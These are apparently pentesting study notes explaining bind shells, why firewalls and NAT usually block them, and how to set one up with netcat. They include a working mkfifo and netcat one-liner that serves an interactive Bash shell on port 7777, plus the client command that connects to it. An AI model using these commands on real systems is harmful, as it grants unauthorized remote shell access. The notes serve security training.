- With a bind shell, **the target system has a listener** started and awaits a **connection from a pentester's system** (attack box).
- Admins typically configure **strict incoming firewall rules and NAT** (with PAT implementation) on the edge of the network (public-facing), so **we would need to be on the internal network already.**
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

# Establishing a Basic Bind Shell with Netcat
---
- On the server-side, we will need to specify the directory, shell, listener, work with some pipelines, and input & output redirection to ensure a shell to the system gets served when the client attempts to connect.

- No. 1: Server - Binding a Bash shell to the TCP session:
	- `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <PINGABLE_IP> 7777 > /tmp/f`
- No. 2: Client - Connecting to bind shell on target
	- `nc -nv <VICTIM_IP> 7777`